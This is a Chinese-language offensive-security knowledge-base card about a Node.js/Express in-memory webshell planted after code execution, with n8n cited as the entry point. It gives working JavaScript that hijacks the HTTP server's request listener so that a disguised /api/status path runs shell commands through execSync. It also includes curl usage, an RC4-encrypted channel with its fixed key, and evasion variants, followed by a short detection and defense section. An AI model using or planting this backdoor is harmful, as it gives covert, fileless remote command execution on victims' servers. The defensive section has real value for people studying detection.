---
id: web-nodejs-express-request-listener-memshell
title: Node.js/Express 内存马：劫持 server._events.request 植入 HTTP 命令通道
type: scenario
domain: web
path: web/nodejs
technique: nodejs-http-request-listener-hijack
tags:
- nodejs
- express
- memshell
- persistence
- http
- code-injection
- rc4
- n8n
- post-exploitation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T09:03:44+08:00'
  notes: 已对照原文及5张图核对：图01 流程图（RCE→require→child_process→HTTP Server→劫持 _events.request/注入 _router.stack→保存原 handler→恶意 handler→透传）；图02 curl /api/status?cmd=whoami 返回 {"ok":true,"data":"node\n"}；图03/05 Set 节点表达式 this.process.mainModule.require('child_process').execSync('id') 输出 uid=1000(node)；图04 Manual Trigger+Edit Fields 工作流。卡只保留可复用增量（_getActiveHandles 定位、_events.request 替换、global 动态 payload、RC4+Base64 通道、.constructor 规避），前置 CVE 与既有卡重复跳过合理；文章自述哥斯拉内存马未调试成功，卡未采用。卡为通用 Node.js/Express 技术，不绑定 n8n 版本，未设 affected_versions。PoC 未在本机执行。
url: /docs/web/nodejs/web-nodejs-express-request-listener-memshell/
draft: false
kb_aliases:
- Node.js 内存马
- Express 内存马
- server._events.request 劫持
- Node HTTP 后门
- n8n 内存马
- RC4 加密内存马
---

## 一句话结论

在已取得 Node.js 进程内代码执行（原文以 n8n 表达式注入 CVE-2025-68613 为入口）后，可遍历 `process._getActiveHandles()` 找到带 `_events.request` 的 HTTP Server，保存原始监听器并替换为自定义函数：命中预定路径时执行 `execSync` 并回显，其他请求透传给原监听器，从而在进程内存中建立无文件落地、重启前持续有效的 HTTP 命令通道。

## 原理

- **Node HTTP 的请求分发**：`http.Server` 继承 `EventEmitter`，每个请求触发 `request` 事件，实际监听器保存在 `server._events.request`。Express 应用本身就是其中一个监听器（`app` 作为 `(req,res)=>...` 函数被注册）。
- **同进程替换**：在已能执行 JS 的前提下，把 `server._events.request` 指向攻击者函数即可在 Express 路由之前拦截所有 HTTP 请求；这是普通对象属性赋值，不涉及内核或二进制注入。
- **透明性**：恶意监听器只处理特定路径（原文为 `/api/status`），其余请求调用保存的原始监听器，因此业务功能不受影响，不易被功能测试发现。
- **无文件持久化**：后门只存在于 V8 堆中，磁盘无落地；但进程重启即失效。原文把动态 payload 存入 `global.<随机名>`，实现跨请求复用并可远程更新执行器。
- **加密通道**：高级版用 RC4（固定密钥）+ Base64 包装命令与回显，POST body 为 JSON，降低流量关键词与命令明文暴露；GET 模式仍保留明文 `?cmd=` 便于快速操作。
- **定位方式**：`process._getActiveHandles()` 返回 libuv 活动句柄，HTTP Server 是其中之一；用 `h._events && h._events.request` 作为特征判断，避免使用 `.constructor`（原文指出该写法会触发 n8n 的表达式安全检测）。

## 触发条件

- 攻击者已能在目标 Node 进程内执行任意 JavaScript（表达式注入、原型污染转 RCE、依赖漏洞、已控后台的脚本节点等）。
- 进程内存在对外提供 HTTP 服务的 `http.Server`，且其 `request` 监听器为可替换的函数（单监听器场景）。
- 目标路径（如 `/api/status`）未被业务路由或前置网关占用/拦截；进程在植入后不重启。
- 需要持久化时，攻击者还需维持触发 RCE 的入口或已获得其他驻留手段。

## 利用步骤

1. 先用 RCE 执行 `id`/`whoami`，确认代码运行在目标 Node 进程内（原文 n8n 返回 `uid=1000(node)`）。
2. 通过 `this.process._getActiveHandles()` 找到 `_events.request` 存在的 HTTP Server，保存 `originalHandler`。
3. 用恶意函数替换 `server._events.request`：解析 `?cmd=`，`execSync` 执行并返回 JSON；未命中时调用原始 handler。
4. 访问 `http://target:5678/api/status?cmd=whoami` 验证回显。
5. 升级为 RC4+Base64 的 POST 通道：首次请求解密并 `new Function(payload)()` 存入 `global`，后续请求复用；用 Python 客户端交互执行命令。
6. 清理：删除 `global` 上的 payload 并重启进程才能完全移除被替换的监听器。

## PoC

```javascript
// 在可控表达式/脚本节点中执行（原文 n8n Set 节点表达式）
(function () {
  var require = this.process.mainModule.require;
  var execSync = require('child_process').execSync;
  var handles = this.process._getActiveHandles();
  var server = null;
  for (var i = 0; i < handles.length; i++) {
    if (handles[i] && handles[i]._events && handles[i]._events.request) {
      server = handles[i]; break;
    }
  }
  if (!server) return 'server not found';

  var original = server._events.request;
  server._events.request = function (req, res) {
    if (req.url && req.url.indexOf('/api/status') === 0) {
      var m = req.url.match(/[?&]cmd=([^&]+)/);
      if (m) {
        try {
          var out = execSync(decodeURIComponent(m[1]), { encoding: 'utf8', timeout: 10000 });
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: true, data: out }));
          return;
        } catch (e) {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: false, err: e.message }));
          return;
        }
      }
    }
    return original.call(this, req, res);
  };
  return 'installed';
})()
```

```bash
curl "http://target:5678/api/status?cmd=whoami"
# {"ok":true,"data":"node\n"}
```

加密版的核心变化：POST `/api/status` 的 `{"data": "<base64(RC4(cmd))>"}` 先解密执行，再用同一 RC4 密钥加密回显；原文密钥为 `3c6e0b8a9c15224a`，并配套 Python 交互客户端。

## 变体与关联

- 变体：注入 Express 中间件到 `app._router.stack`（原文流程图中的方式 2），在路由匹配前执行；替换 `http.Server.prototype.emit` 或 `server.on('request')`；处理 `_events.request` 为数组（多个监听器）的情况；把后门路径伪装为 `/api/status`、`/health`、`/monitor` 等。
- 关联：`[[web-nodejs-n8n-expression-sandbox-escape-rce]]`（原文的前置 RCE 入口，CVE-2025-68613）；`[[web-python-framework-flask-method-override-component-memshell]]`（Flask 内存马，同属框架层请求处理劫持）；`[[defense-detection-arthas-agent-memshell-detect-remove]]`（Java 内存马检测思路可借鉴）。
- 与文件型 WebShell 的区别：无文件落地、重启失效；检测需看进程内存/活动句柄，而非磁盘扫描。

## 检测与防御

- 检测：在 Node 进程内检查 `process._getActiveHandles()` 中 HTTP Server 的 `_events.request.toString()` 是否包含 `execSync`、`child_process`、`api/status`、`rc4` 等特征（原文给出自检代码）；检查 `global` 上的异常对象；监控 Node 进程异常派生 `sh`/`cmd`/`whoami` 等子进程；对 n8n 审计工作流与表达式变更。
- 修复/缓解：及时修复前置 RCE（n8n 升级到修复版本、启用 `N8N_BLOCK_ENV_ACCESS_IN_NODE=true`、限制工作流创建权限）；发现后重启进程清除内存马；容器化与最小权限运行；RASP/EDR 监控 `child_process` 调用与运行时函数替换。
- 长期：对 Node 服务做运行时完整性校验（监听器指纹、启动时基线对比）；限制可执行任意 JS 的功能（表达式、脚本节点）对不可信用户开放。
